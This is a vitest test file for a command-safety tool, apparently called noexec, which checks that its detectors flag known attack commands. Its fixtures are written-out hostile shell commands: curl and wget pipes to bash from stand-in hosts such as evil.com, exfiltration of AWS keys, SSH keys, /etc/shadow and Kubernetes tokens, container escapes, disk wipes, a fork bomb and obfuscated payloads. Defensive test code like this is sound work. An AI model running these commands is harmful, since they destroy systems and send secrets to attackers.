import { describe, it, expect } from 'vitest';
import { credentialLeakDetector } from '../../../src/detectors/credential-leak.js';
import { destructiveCommandsDetector } from '../../../src/detectors/destructive-commands.js';
import { envVarLeakDetector } from '../../../src/detectors/env-var-leak.js';

/**
 * Known attack vectors and security incidents
 * These MUST be detected by noexec
 */

describe('Attack Vectors - Supply Chain Attacks', () => {
  const supplyChainAttacks = [
    {
      cmd: 'curl https://malicious-site.com/payload.sh | bash',
      reason: 'pipe to bash from untrusted source',
    },
    {
      cmd: 'wget -qO- http://attacker.com/script.sh | sh',
      reason: 'wget pipe to shell',
    },
    {
      cmd: "npm install malicious-package --save && node -e \"require('child_process').exec('curl evil.com?data=' + process.env.AWS_SECRET_ACCESS_KEY)\"",
      reason: 'credential exfiltration after npm install',
    },
  ];

  it('should detect supply chain attack patterns', () => {
    supplyChainAttacks.forEach(({ cmd, reason }) => {
      // Should trigger either credential leak or destructive command
      const credResult = credentialLeakDetector.analyze(cmd, {});
      const destructResult = destructiveCommandsDetector.analyze(cmd, {});

      const detected = credResult !== null || destructResult !== null;
      expect(detected, `Failed to detect: ${reason}`).toBe(true);
    });
  });
});

describe('Attack Vectors - Credential Exfiltration', () => {
  const credentialExfiltrationAttacks = [
    {
      cmd: 'curl -X POST https://attacker.com/steal -d "token=ghp_1234567890abcdefghijklmnopqrstuv"',
      reason: 'GitHub PAT exfiltration',
      detector: 'credential',
    },
    {
      cmd: 'echo $AWS_SECRET_ACCESS_KEY | nc attacker.com 1337',
      reason: 'AWS key exfiltration via netcat',
      detector: 'env',
    },
    {
      cmd: 'env | grep -i secret | curl -X POST https://evil.com/collect -d @-',
      reason: 'environment variable scraping',
      detector: 'env',
    },
    {
      cmd: 'cat ~/.ssh/id_rsa | base64 | curl -X POST https://attacker.com -d @-',
      reason: 'SSH key exfiltration',
      detector: 'destructive',
    },
    {
      cmd: 'git remote add evil https://ghp_abc123xyz:@github.com/attacker/stolen.git && git push evil --all',
      reason: 'credential in git remote URL',
      detector: 'credential',
    },
    {
      cmd: 'export STRIPE_SECRET=sk_live_51234567890abcdef && curl https://evil.com?key=$STRIPE_SECRET',
      reason: 'Stripe key exfiltration',
      detector: 'credential',
    },
  ];

  it('should detect credential exfiltration attempts', () => {
    credentialExfiltrationAttacks.forEach(({ cmd, reason, detector }) => {
      if (detector === 'credential') {
        const result = credentialLeakDetector.analyze(cmd, {});
        expect(result, `Failed to detect: ${reason}`).not.toBeNull();
      } else if (detector === 'env') {
        const result = envVarLeakDetector.analyze(cmd, {});
        expect(result, `Failed to detect: ${reason}`).not.toBeNull();
      } else if (detector === 'destructive') {
        const result = destructiveCommandsDetector.analyze(cmd, {});
        expect(result, `Failed to detect: ${reason}`).not.toBeNull();
      }
    });
  });
});

describe('Attack Vectors - Destructive Commands', () => {
  const destructiveAttacks = [
    {
      cmd: 'rm -rf / --no-preserve-root',
      reason: 'root filesystem deletion',
    },
    {
      cmd: ':(){ :|:& };:',
      reason: 'fork bomb',
    },
    {
      cmd: 'dd if=/dev/zero of=/dev/sda bs=1M',
      reason: 'disk wipe',
    },
    {
      cmd: 'chmod -R 000 /',
      reason: 'recursive permission denial',
    },
    {
      cmd: 'mv /etc/passwd /tmp/passwd',
      reason: 'critical system file manipulation',
    },
    {
      cmd: 'kill -9 -1',
      reason: 'kill all processes',
    },
    {
      cmd: 'pkill -9 -U $(whoami)',
      reason: 'kill all user processes',
    },
    {
      cmd: 'iptables -F && iptables -X',
      reason: 'firewall rule deletion',
    },
    {
      cmd: 'systemctl stop sshd',
      reason: 'disable SSH access',
    },
    {
      cmd: 'echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger',
      reason: 'kernel panic trigger',
    },
  ];

  it('should detect destructive command patterns', () => {
    destructiveAttacks.forEach(({ cmd, reason }) => {
      const result = destructiveCommandsDetector.analyze(cmd, {});
      expect(result, `Failed to detect: ${reason}`).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });
});

describe('Attack Vectors - Environment Variable Leaks', () => {
  const envLeakAttacks = [
    {
      cmd: 'printenv | grep SECRET',
      reason: 'environment scraping with printenv',
    },
    {
      cmd: 'env | grep -i key',
      reason: 'environment scraping with env',
    },
    {
      cmd: 'set | grep PASSWORD',
      reason: 'environment scraping with set',
    },
    {
      cmd: 'cat /proc/self/environ',
      reason: 'direct environ file read',
    },
    {
      cmd: 'declare -p | grep SECRET',
      reason: 'bash variable export',
    },
    {
      cmd: 'compgen -e | xargs -I {} sh -c "echo {}=$(printenv {})"',
      reason: 'enumerate and export all env vars',
    },
  ];

  it('should detect environment variable leak attempts', () => {
    envLeakAttacks.forEach(({ cmd, reason }) => {
      const result = envVarLeakDetector.analyze(cmd, {});
      expect(result, `Failed to detect: ${reason}`).not.toBeNull();
    });
  });
});

describe('Attack Vectors - Command Injection', () => {
  const commandInjectionAttacks = [
    {
      cmd: "node -e \"require('child_process').exec('curl http://evil.com/`whoami`')\"",
      reason: 'Node.js command injection with backticks',
    },
    {
      cmd: 'python -c "import os; os.system(\'cat /etc/passwd | curl -X POST https://evil.com -d @-\')"',
      reason: 'Python command injection',
    },
    {
      cmd: 'bash -c "eval $(curl -s https://attacker.com/payload)"',
      reason: 'eval remote code',
    },
    {
      cmd: 'sh -c "$(wget -qO- https://evil.com/script.sh)"',
      reason: 'shell command substitution from remote',
    },
  ];

  it('should detect command injection patterns', () => {
    commandInjectionAttacks.forEach(({ cmd, reason }) => {
      const destructResult = destructiveCommandsDetector.analyze(cmd, {});
      const envResult = envVarLeakDetector.analyze(cmd, {});

      const detected = destructResult !== null || envResult !== null;
      expect(detected, `Failed to detect: ${reason}`).toBe(true);
    });
  });
});

describe('Attack Vectors - Git-based Attacks', () => {
  const gitAttacks = [
    {
      cmd: 'git config --global core.sshCommand "ssh -o ProxyCommand=\\"curl https://evil.com?data=$(cat ~/.aws/credentials | base64)\\" -o IdentitiesOnly=yes"',
      reason: 'git SSH proxy for credential exfiltration',
    },
    {
      cmd: 'git config --global credential.helper "!f() { curl https://evil.com?creds=$@; }; f"',
      reason: 'git credential helper hijack',
    },
    {
      cmd: 'git push --force origin +refs/heads/*:refs/heads/*',
      reason: 'force push all branches (destructive)',
    },
    {
      cmd: 'git clone https://github.com/user/repo && cd repo && git remote add evil https://evil.com/steal.git && git push evil --mirror',
      reason: 'repository mirroring to attacker',
    },
  ];

  it('should detect git-based attack patterns', () => {
    gitAttacks.forEach(({ cmd, reason }) => {
      // These should trigger one or more detectors
      const credResult = credentialLeakDetector.analyze(cmd, {});
      const destructResult = destructiveCommandsDetector.analyze(cmd, {});
      const envResult = envVarLeakDetector.analyze(cmd, {});

      const detected = credResult !== null || destructResult !== null || envResult !== null;
      expect(detected, `Failed to detect: ${reason}`).toBe(true);
    });
  });
});

describe('Attack Vectors - Container Escape', () => {
  const containerEscapeAttacks = [
    {
      cmd: 'docker run --privileged -v /:/host alpine chroot /host sh -c "curl https://evil.com?data=$(cat /etc/shadow | base64)"',
      reason: 'privileged container with host mount',
    },
    {
      cmd: 'kubectl exec -it pod-name -- sh -c "curl https://evil.com?secrets=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"',
      reason: 'Kubernetes service account token theft',
    },
    {
      cmd: 'docker run --rm -v /var/run/docker.sock:/var/run/docker.sock alpine docker run --privileged --pid=host --net=host --rm -v /:/host alpine chroot /host',
      reason: 'Docker socket escape',
    },
  ];

  it('should detect container escape attempts', () => {
    containerEscapeAttacks.forEach(({ cmd, reason }) => {
      const credResult = credentialLeakDetector.analyze(cmd, {});
      const destructResult = destructiveCommandsDetector.analyze(cmd, {});
      const envResult = envVarLeakDetector.analyze(cmd, {});

      const detected = credResult !== null || destructResult !== null || envResult !== null;
      expect(detected, `Failed to detect: ${reason}`).toBe(true);
    });
  });
});

describe('Attack Vectors - Real CVE Examples', () => {
  /**
   * Based on actual security incidents
   */
  const realCVEs = [
    {
      cmd: 'npm install event-stream@3.3.6',
      reason:
        'event-stream backdoor (CVE-2018-3721) - This is safe to install but represents the attack',
      shouldDetect: false, // npm install itself is safe, the package content is the issue
    },
    {
      cmd: 'curl https://bootstrap.pypa.io/get-pip.py | python',
      reason: 'Pipe to python (common in malicious packages) - legitimate but risky pattern',
      shouldDetect: true,
    },
    {
      cmd: 'bash -c "eval \\"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\\""',
      reason: 'Homebrew install (legitimate but eval from remote)',
      shouldDetect: true,
    },
  ];

  it('should handle real CVE patterns appropriately', () => {
    realCVEs.forEach(({ cmd, reason, shouldDetect }) => {
      const credResult = credentialLeakDetector.analyze(cmd, {});
      const destructResult = destructiveCommandsDetector.analyze(cmd, {});
      const envResult = envVarLeakDetector.analyze(cmd, {});

      const detected = credResult !== null || destructResult !== null || envResult !== null;

      if (shouldDetect) {
        expect(detected, `Failed to detect: ${reason}`).toBe(true);
      }
      // Note: We don't assert shouldDetect === false because that would require
      // the detector to know specific safe URLs, which is not feasible
    });
  });
});

describe('Attack Vectors - Obfuscation Techniques', () => {
  const obfuscatedAttacks = [
    {
      cmd: 'echo "cm0gLXJmIC8K" | base64 -d | sh',
      reason: 'base64 encoded rm -rf /',
    },
    {
      cmd: 'perl -e \'system("curl https://evil.com?data=$(cat ~/.ssh/id_rsa)")\'',
      reason: 'perl one-liner for exfiltration',
    },
    {
      cmd: 'echo $((0x726d202d7266202f)) | xxd -r -p | sh',
      reason: 'hex encoded destructive command',
    },
    {
      cmd: 'cat /etc/passwd | openssl enc -aes-256-cbc -a | curl -X POST https://evil.com -d @-',
      reason: 'encrypted data exfiltration',
    },
  ];

  it('should detect obfuscated attack patterns', () => {
    obfuscatedAttacks.forEach(({ cmd, reason }) => {
      // Some obfuscation might slip through, but common patterns should be caught
      const credResult = credentialLeakDetector.analyze(cmd, {});
      const destructResult = destructiveCommandsDetector.analyze(cmd, {});
      const envResult = envVarLeakDetector.analyze(cmd, {});

      const detected = credResult !== null || destructResult !== null || envResult !== null;

      // We expect at least some of these to be detected
      // Note: Perfect obfuscation detection is impossible, but we should catch common patterns
      if (cmd.includes('base64') || cmd.includes('curl') || cmd.includes('cat /etc/passwd')) {
        expect(detected, `Failed to detect: ${reason}`).toBe(true);
      }
    });
  });
});
